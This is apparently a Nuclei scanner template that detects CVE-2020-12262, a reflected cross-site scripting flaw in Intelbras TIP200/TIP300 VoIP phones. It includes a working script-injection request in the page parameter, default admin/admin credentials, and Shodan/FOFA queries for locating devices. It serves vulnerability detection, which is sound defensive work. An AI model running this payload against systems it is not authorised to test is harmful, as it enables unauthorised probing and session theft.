id: CVE-2020-12262

info:
  name: Intelbras TIP200/TIP200LITE/TIP300 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    Intelbras TIP200 60.61.75.15, TIP200LITE 60.61.75.15, and TIP300 65.61.75.15 are vulnerable to reflected cross-site scripting (XSS) via the page parameter in /cgi-bin/cgiServer.exx, allowing attackers to execute arbitrary JavaScript in the context of the user.
  impact: |
    Authenticated attackers can inject malicious JavaScript through the page parameter, potentially stealing session cookies or performing unauthorized actions on behalf of authenticated users.
  remediation: |
    Update the device firmware to the latest version provided by Intelbras.
  reference:
    - https://lucxs.medium.com/cve-2020-12262-xss-voip-intelbras-d5697e31fbf6
    - https://www.youtube.com/watch?v=rihboOgiJRs
    - https://nvd.nist.gov/vuln/detail/CVE-2020-12262
  classification:
    cve-id: CVE-2020-12262
    cwe-id: CWE-79
    epss-score: 0.01038
    epss-percentile: 0.76961
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
    cvss-score: 5.4
  metadata:
    max-request: 1
    product: tip300
    vendor: intelbras
    shodan-query: title:"Intelbras"
    fofa-query: title="Intelbras"
  tags: cve,cve2020,intelbras,tip200,tip200lite,tip300,xss,authenticated,vuln

variables:
  username: "admin"
  password: "admin"

http:
  - raw:
      - |
        GET /cgi-bin/cgiServer.exx?page=<script>alert(document.domain)</script> HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64('{{username}}:' + '{{password}}')}}

    skip-variables-check: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "File not found"
        condition: and

      - type: word
        part: content_type
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a0048304602210093915ab8510a0d065605ae28f606408de8a8610606134173d161bcc0ec1f59fa022100aa7a68b6bc7009dd6ec0c6e38693b0d85cbb27787a9ee97da8ab549cdb209f98:922c64590222798bb761d5b6d8e72950